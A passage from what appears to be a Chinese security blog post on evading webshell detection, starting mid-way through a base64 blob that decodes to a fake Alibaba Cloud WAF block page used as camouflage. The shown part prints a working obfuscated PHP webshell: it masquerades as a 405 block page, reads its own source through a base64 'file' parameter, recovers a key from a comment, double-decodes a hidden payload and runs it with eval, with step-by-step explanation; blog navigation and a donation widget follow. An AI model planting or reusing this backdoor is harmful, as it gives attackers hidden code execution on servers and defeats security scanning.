CAgICBjb2xvcjogIzNiNmVhMzsKICAgICAgICB9CgogICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICB3aWR0aDogMTAwMHB4OwogICAgICAgICAgICBtYXJnaW46IGF1dG87CiAgICAgICAgICAgIGNvbG9yOiAjNjk2OTY5OwogICAgICAgIH0KCiAgICAgICAgLmhlYWRlciB7CiAgICAgICAgICAgIHBhZGRpbmc6IDUwcHggMDsKICAgICAgICB9CgogICAgICAgIC5oZWFkZXIgLm1lc3NhZ2UgewogICAgICAgICAgICBoZWlnaHQ6IDM2cHg7CiAgICAgICAgICAgIHBhZGRpbmctbGVmdDogMTIwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHVybChodHRwczovL2Vycm9ycy5hbGl5dW4uY29tL2ltYWdlcy9UQjFUcGFtSHBYWFhYYUpYWFhYZUI3bllWWFgtMTA0LTE2Mi5wbmcpIG5vLXJlcGVhdCAwIC0xMjhweDsKICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDM2cHg7CiAgICAgICAgfQoKICAgICAgICAubWFpbiB7CiAgICAgICAgICAgIHBhZGRpbmc6IDUwcHggMDsKICAgICAgICAgICAgYmFja2dyb3VuZDoKICAgICAgICAgICAgICAgICNmNGY1Zjc7CiAgICAgICAgfQoKICAgICAgICAubWFpbiBpbWcgewogICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgICAgIGxlZnQ6IDEyMHB4OwogICAgICAgIH0KCiAgICAgICAgLmZvb3RlciB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6CiAgICAgICAgICAgICAgICAzMHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiByaWdodDsKICAgICAgICB9CgogICAgICAgIC5mb290ZXIgYSB7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweCAzMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOgogICAgICAgICAgICAgICAgMTBweDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzRiYWJlYzsKICAgICAgICB9CgogICAgICAgIC5mb290ZXIgYTpob3ZlciB7CiAgICAgICAgICAgIG9wYWNpdHk6IC44OwogICAgICAgIH0KCiAgICAgICAgLmFsZXJ0LXNoYWRvdyB7CiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgdG9wOiAwOwogICAgICAgICAgICBsZWZ0OiAwOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgaGVpZ2h0OgogICAgICAgICAgICAgICAgMTAwJTsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzk5OTsKICAgICAgICAgICAgb3BhY2l0eTogLjU7CiAgICAgICAgfQoKICAgICAgICAuYWxlcnQgewogICAgICAgICAgICBkaXNwbGF5OiBub25lOwogICAgICAgICAgICBwb3NpdGlvbjoKICAgICAgICAgICAgICAgIGFic29sdXRlOwogICAgICAgICAgICB0b3A6IDIwMHB4OwogICAgICAgICAgICBsZWZ0OiA1MCU7CiAgICAgICAgICAgIHdpZHRoOiA2MDBweDsKICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IC0zMDBweDsKICAgICAgICAgICAgcGFkZGluZy1ib3R0b206CiAgICAgICAgICAgICAgICAyNXB4OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjZGRkOwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDJweCAycHggMXB4IHJnYmEoMCwgMCwgMCwgLjEpOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjZmZmOwogICAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgICAgIGNvbG9yOiAjNjk2OTY5OwogICAgICAgIH0KCiAgICAgICAgLmFsZXJ0IGgyIHsKICAgICAgICAgICAgbWFyZ2luOgogICAgICAgICAgICAgICAgMCAycHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHggMTVweCA1cHggMTVweDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgICAgICBmb250LXdlaWdodDogbm9ybWFsOwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgI2RkZDsKICAgICAgICB9CgogICAgICAgIC5hbGVydCBhIHsKICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgcmlnaHQ6IDEwcHg7CiAgICAgICAgICAgIHRvcDogOHB4OwogICAgICAgICAgICB3aWR0aDogMzBweDsKICAgICAgICAgICAgaGVpZ2h0OiAyMHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgfQoKICAgICAgICAuYWxlcnQgcCB7CiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHggMTVweDsKICAgICAgICB9CgogICAgICAgICNmZWVkYmFjay1jb250YWluZXIgewogICAgICAgICAgICB3aWR0aDogMTEwcHg7CiAgICAgICAgICAgIG1hcmdpbjogYXV0bzsKICAgICAgICAgICAgbWFyZ2luLXRvcDogMTIwcHg7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICB9CgogICAgICAgICNxcmNvZGUgewogICAgICAgICAgICBtYXJnaW46IDAgMTVweCA1cHggMTVweDsKICAgICAgICB9CgogICAgICAgICNmZWVkYmFjayBhIHsKICAgICAgICAgICAgY29sb3I6ICM5OTk7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTJweDsKICAgICAgICAgICAgbWFyZ2luLXRvcDogNXB4OwogICAgICAgIH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KCjxib2R5IGRhdGEtc3BtPSI3NjYzMzU0Ij4KICAgIDxzY3JpcHQ+CiAgICAgICAgd2l0aCAoZG9jdW1lbnQpIHdpdGggKGJvZHkpIHdpdGggKGluc2VydEJlZm9yZShjcmVhdGVFbGVtZW50KCJzY3JpcHQiKSwgZmlyc3RDaGlsZCkpIHNldEF0dHJpYnV0ZSgiZXhwYXJhbXMiLCAiY2F0ZWdvcnk9JnVzZXJpZD02ODUzMDgyOTUmYXBsdXMmdWRwaWQ9VldlVU9jZVFKZEtqJiZ5dW5pZD0mZTkzYjRlM2U3NWUwNSZ0cmlkPTY1MjViNzk2MTU4MzkyMDYwOTQwMDM5MzhlJmFzaWQ9QVlmNTJDamh0V2hlK2FmK0hRQUFBQUNXQS9TSW5PM1FMdz09IiwgaWQgPSAidGItYmVhY29uLWFwbHVzIiwgc3JjID0gKGxvY2F0aW9uID4gImh0dHBzIiA/ICIvL2ciIDogIi8vZyIpICsgIi5hbGljZG4uY29tL2FsaWxvZy9tbG9nL2FwbHVzX3YyLmpzIikKICAgIDwvc2NyaXB0PgogICAgPHNjcmlwdD4KICAgICAgICAvLwogICAgICAgIHZhciBpMThuT2JqZWN0ID0gewogICAgICAgICAgICAiemgtY24iOiB7CiAgICAgICAgICAgICAgICAibWVzc2FnZSI6ICLlvojmirHmrYnvvIznlLHkuo7mgqjorr/pl67nmoRVUkzmnInlj6/og73lr7nnvZHnq5npgKDmiJDlronlhajlqIHog4HvvIzmgqjnmoTorr/pl67ooqvpmLvmlq3jgIIiLAogICAgICAgICAgICAgICAgImJnSW1nIjogImh0dHBzOi8vZXJyb3JzLmFsaXl1bi5jb20vaW1hZ2VzL1RCMTVRR2FIcFhYWFhYT2FYWFhYaWEzOVhYWC02NjAtMTE3LnBuZyIsCiAgICAgICAgICAgICAgICAicmVwb3J0IjogIuivr+aKpeWPjemmiCIsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJlbi11cyI6IHsKICAgICAgICAgICAgICAgICJtZXNzYWdlIjogIlNvcnJ5LCB3ZSBoYXZlIGRldGVjdGVkIG1hbGljaW91cyB0cmFmZmljIGZyb20geW91ciBuZXR3b3JrLCBwbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiIsCiAgICAgICAgICAgICAgICAiYmdJbWciOiAiaHR0cHM6Ly9pbWcuYWxpY2RuLmNvbS90ZnMvVEIxQURBT0lGenFLMVJqU1pTZ1hYY3BBVlhhLTEzMjAtMjM0LmpwZyIsCiAgICAgICAgICAgICAgICAicmVwb3J0IjogIlJlcG9ydCIsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgdmFyIGkxOG4gPSBpMThuT2JqZWN0WyJlbi11cyJdOwogICAgICAgIGlmIChuYXZpZ2F0b3IubGFuZ3VhZ2UuaW5kZXhPZigiemgiKSA+PSAwKSB7CiAgICAgICAgICAgIGkxOG4gPSBpMThuT2JqZWN0WyJ6aC1jbiJdOwogICAgICAgIH0KCiAgICA8L3NjcmlwdD4KCiAgICA8ZGl2IGRhdGEtc3BtPSIxOTk4NDEwNTM4Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSI+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD5kb2N1bWVudC53cml0ZShpMThuLm1lc3NhZ2UpPC9zY3JpcHQ+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ibWFpbiI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8c2NyaXB0PmRvY3VtZW50LndyaXRlKCc8aW1nIHdpZHRoPSI2NjAiIGhlaWdodD0iMTE3IiBzcmM9IicgKyBpMThuLmJnSW1nICsgJyIvPicpPC9zY3JpcHQ+CgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPHNwYW4gc3R5bGU9J2Rpc3BsYXk6bm9uZSc+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gZ2V0UXVlcnlTdHJpbmcodXJsLCBuYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcmVnID0gbmV3IFJlZ0V4cCgnKF58JiknICsgbmFtZSArICc9KFteJl0qKSgmfCQpJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IHVybC5zdWJzdHIoMSkubWF0Y2gocmVnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChyICE9PSBudWxsKSByZXR1cm4gdW5lc2NhcGUoclsyXSk7IHJldHVybiBudWxsOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBfX3V1aWRfX18gPSBnZXRRdWVyeVN0cmluZyhsb2NhdGlvbi5ocmVmLCAidXVpZCIpCiAgICAgICAgICAgICAgICAgICAgPC9zY3JpcHQ+CiAgICAgICAgICAgICAgICA8L3NwYW4+CiAgICAgICAgICAgICAgICA8YSB0YXJnZXQ9Il9ibGFuayIgaWQ9InJlcG9ydCIgaHJlZj0iamF2YXNjcmlwdDo7IiBkYXRhLXNwbS1jbGljaz0iZ29zdHI9L3dhZi4xMjMuMTIzO2xvY2FpZD1kMDAxOyI+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD5kb2N1bWVudC53cml0ZShpMThuLnJlcG9ydCk8L3NjcmlwdD4KICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImFsZXJ0U2hhZG93IiBjbGFzcz0iYWxlcnQtc2hhZG93Ij4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0iYWxlcnRDb250YWluZXIiIGNsYXNzPSJhbGVydCI+CiAgICAgICAgPGgyPgogICAgICAgICAgICDmj5DnpLrvvJoKICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDo7IiB0aXRsZT0i5YWz6ZetIiBpZD0iY2xvc2VBbGVydCI+CiAgICAgICAgICAgICAgICBYCiAgICAgICAgICAgIDwvYT4KICAgICAgICA8L2gyPgogICAgICAgIDxwPgogICAgICAgICAgICDmhJ/osKLmgqjnmoTlj43ppojvvIzlupTnlKjpmLLngavlopnkvJrlsL3lv6vov5vooYzliIbmnpDlkoznoa7orqTjgIIKICAgICAgICA8L3A+CiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImZlZWRiYWNrLWNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBpZD0icXJjb2RlIj48L2Rpdj4KICAgICAgICA8ZGl2IGlkPSJmZWVkYmFjayI+PC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQ+CiAgICAgICAgZnVuY3Rpb24gc2hvdygpIHsKICAgICAgICAgICAgdmFyIGcgPSBmdW5jdGlvbiAoZWxlKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoZWxlKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgdmFyIHJlcG9ydEhhbmRsZSA9IGcoJ3JlcG9ydCcpOwogICAgICAgICAgICB2YXIgYWxlcnRTaGFkb3cgPSBnKCdhbGVydFNoYWRvdycpOwogICAgICAgICAgICB2YXIgYWxlcnRDb250YWluZXIgPSBnKCdhbGVydENvbnRhaW5lcicpOwogICAgICAgICAgICB2YXIgY2xvc2VBbGVydCA9IGcoJ2Nsb3NlQWxlcnQnKTsKICAgICAgICAgICAgdmFyIG93biA9IHt9OwogICAgICAgICAgICBvd24ucmVwb3J0ID0gZnVuY3Rpb24gKCkgeyAKICAgICAgICAgICAgICAgIG93bi5hbGVydCgpOwogICAgICAgICAgICB9OyBvd24uYWxlcnQgPSBmdW5jdGlvbiAoKSB7IGFsZXJ0U2hhZG93LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOyBhbGVydENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsgfTsgb3duLmNsb3NlID0gZnVuY3Rpb24gKCkgeyBhbGVydFNoYWRvdy5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyBhbGVydENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyB9OwogICAgICAgIH07CgogICAgICAgIHZhciB1dWlkID0gbG9jYXRpb24uaHJlZi5tYXRjaCgvdXVpZD0oW14mXSspLyk7CiAgICAgICAgdXVpZCA9IHV1aWQgJiYgZW5jb2RlVVJJQ29tcG9uZW50KHV1aWRbMV0pOwogICAgICAgIHZhciB1cmxRckNvZGUgPSBsb2NhdGlvbi5ocmVmLm1hdGNoKC9xcmNvZGU9KFteJl0rKS8pOwogICAgICAgIHVybFFyQ29kZSA9IHVybFFyQ29kZSAmJiBkZWNvZGVVUklDb21wb25lbnQodXJsUXJDb2RlWzFdKTsKICAgICAgICBpZiAodXVpZCB8fCB1cmxRckNvZGUpIHsKICAgICAgICAgICAgdmFyIHFyY29kZSA9IG5ldyBRUkNvZGUoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInFyY29kZSIpLCB7CiAgICAgICAgICAgICAgICB0ZXh0OiB1cmxRckNvZGUgfHwgdXVpZCwKICAgICAgICAgICAgICAgIHdpZHRoOiA4MCwKICAgICAgICAgICAgICAgIGhlaWdodDogODAsCiAgICAgICAgICAgICAgICBjb2xvckRhcms6ICIjOTk5IiwKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIHZhciBmZWVkYmFja0xpbmsgPSBnZXRGZWVkYmFja0xpbmsoKTsKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZlZWRiYWNrIikuaW5uZXJIVE1MID0gZmVlZGJhY2tMaW5rOwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBnZXRGZWVkYmFja0xpbmsoKSB7CiAgICAgICAgICAgIHZhciB1cmxPcmlnaW47CiAgICAgICAgICAgIHVybE9yaWdpbiA9IGxvY2F0aW9uLmhyZWYubWF0Y2goL29yaWdpbj0oW14mXSspLyk7CiAgICAgICAgICAgIHVybE9yaWdpbiA9IHVybE9yaWdpbiAmJiBkZWNvZGVVUklDb21wb25lbnQodXJsT3JpZ2luWzFdKS5zcGxpdCgiPyIpWzBdOwogICAgICAgICAgICBpZiAodXJsT3JpZ2luKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHVybE9yaWdpbiA9IG5ldyBVUkwodXJsT3JpZ2luKTsKICAgICAgICAgICAgICAgICAgICBpZiAodXJsT3JpZ2luLnByb3RvY29sICE9PSAiaHR0cHM6IiAmJiB1cmxPcmlnaW4ucHJvdG9jb2wgIT09ICJodHRwOiIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXJsT3JpZ2luID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB1cmxPcmlnaW4gPSB1cmxPcmlnaW4uaHJlZjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHR5cGVvZiB1cmxPcmlnaW4gIT09ICJzdHJpbmciIHx8IHVybE9yaWdpbi5pbmRleE9mKCJodHRwIikgIT09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXJsT3JpZ2luID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB1cmxPcmlnaW4gPSBmaWx0ZXJIdG1sKHVybE9yaWdpbik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBfbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IuYnJvd3Nlckxhbmd1YWdlIHx8IG5hdmlnYXRvci5sYW5ndWFnZTsKICAgICAgICAgICAgdmFyIHRleHQgPSBbInpoLUNOIiwgInpoLWNuIl0uaW5jbHVkZXMoX2xhbmd1YWdlKSA/ICLngrnmiJHlj43ppoggPiIgOiAiQ2xpY2sgdG8gZmVlZGJhY2sgPiI7CiAgICAgICAgICAgIHJldHVybiAnPGEgaHJlZj0iJyArIHVybE9yaWdpbiArICcvX19fX190bWRfX19fXy9wYWdlL2ZlZWRiYWNrP3JhbmQ9UzNXeEdIQWdBdDc1NkVwem53Zk56SnEyQUZBMnFCTmxhM2o2RUlOVVM4V2U5ZGF6TV9pS0VscDhEd1ZTSFpVZXZwQzQxQng3UnppdlhJajlSblpnZGcmdXVpZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHV1aWQpICsgJyZ0eXBlPTYiIHRhcmdldD0iX2JsYW5rIj4nICsgdGV4dCArICc8L2E+JzsKICAgICAgICB9OwogICAgICAgIGZ1bmN0aW9uIGZpbHRlckh0bWwoc3RyKSB7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC8mL2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoLz4vZywgIiIpOwogICAgICAgICAgICBzdHIgPSBzdHIucmVwbGFjZSgvPC9nLCAiIik7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC8iL2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoLycvZywgIiIpOwogICAgICAgICAgICBzdHIgPSBzdHIucmVwbGFjZSgvYC9nLCAiIik7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC9qYXZhc2NyaXB0L2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoL2lmcmFtZS9nLCAiIik7CiAgICAgICAgICAgIHJldHVybiBzdHI7CiAgICAgICAgfQoKICAgIDwvc2NyaXB0PgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGNoYXJzZXQ9InV0Zi04IiBzcmM9Imh0dHBzOi8vZXJyb3JzLmFsaXl1bi5jb20vZXJyb3IuanM/cz0xMCI+CiAgICA8L3NjcmlwdD4KPC9ib2R5PgoKPC9odG1sPg==&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">count</span>(<span class="variable">$_REQUEST</span>) || <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>) )&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);    <span class="title function_ invoke__">http_response_code</span>(<span class="number">405</span>);</span><br><span class="line">    <span class="keyword">echo</span> base64_decode<span class="comment">/**/</span>(<span class="variable">$VEIUrP</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将文件内容通过base64后传入header的serve参数，设置一个file参数值，传入</p>
+<p>QzpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXDEyMy5waHA&#x3D;<br>这里就会将base64解码得到C:\phpStudy\PHPTutorial\WWW\123.php，实际上没用，是一个扰乱视线的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Serve:&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&#x27;WlhaaGvTLtwRENJvTLtwRENDZ2tYMvTLtwRENUJQVTFSYkoyTnRaQ2RkS1RzPQ==&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;application.xml&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br></pre></td></tr></table></figure>
+
+<p>传入之后系统会读取base64解码之后的整个文件内容，因为这个内容在之前serve插入了，所以第一行是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*vTLtwREN*/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>,<span class="number">8</span>,<span class="number">8</span>);</span><br><span class="line"><span class="variable">$template_source</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$username</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$template_source</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$template_source</span>);</span><br><span class="line"><span class="variable">$template_source</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$template_source</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;template_source&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$aes_decode</span>[<span class="number">1</span>]=<span class="variable">$$key</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$aes_decode</span>[<span class="number">1</span>]=<span class="string">&#x27;echo \&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$aes_decode</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这里截取字符串实际上也会把注释内容截取，截取之后剩下</p>
+<p>vTLtwREN，也就作为了username，并且去替换password</p>
+<p>通过两次base64解码和迷惑性的自定义变量实现命令执行</p>
+<h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>有攻就有防，免杀手段是永远更新不完的，上文只是列举了某几个免杀的方法，更多的可以自行探索，这个领域更多还是靠奇思妙想和大胆实操，一个一个去试才能知道哪个方法会更适合自己。</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/webshell/" class="">
+              webshell
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>author:  </strong>wh1t3zer</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>link:  </strong>
+    <a href="/2024/10/26/webshell免杀初探/" target="_blank" title="webshell免杀的一些思考">https://wh1t3zer.github.io/2024/10/26/webshell免杀初探/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>Copyright notice:   </strong>
+      All articles on this website, unless otherwise stated, adopt <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      reprint policy. If reproduced, please indicate source!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/img10.jpg" class="lazyload placeholder" data-srcset="/medias/img10.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+    </div>
+    <a href="/2024/12/03/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88MYSQL%E7%AF%87%EF%BC%89/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> Prev:
+        <div class="title-text">SQL注入总结（MYSQL篇）</div>
+      </div>
+      
+      <!-- <div class="content">
+        0x00写在前面尽管目前厂商的防护手段都经过几轮迭代升级，但SQL注入仍是漏洞高发方式，本文记下对SQL注入所学习到的方
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/img8.jpg" class="lazyload placeholder" data-srcset="/medias/img8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2024/08/30/%E5%9B%BD%E6%8A%A4%E7%BA%A2%E9%98%9F%E5%A4%8D%E7%9B%98/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">某HW红队复盘</div>
+      </div>
+      <!-- <div class="content">
+        0x00前言本次HW作为红队方，负责外围打点，这次HW共有近百个单位参与攻击和防守。
+0x01搜集开始时上级发了一份靶标
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
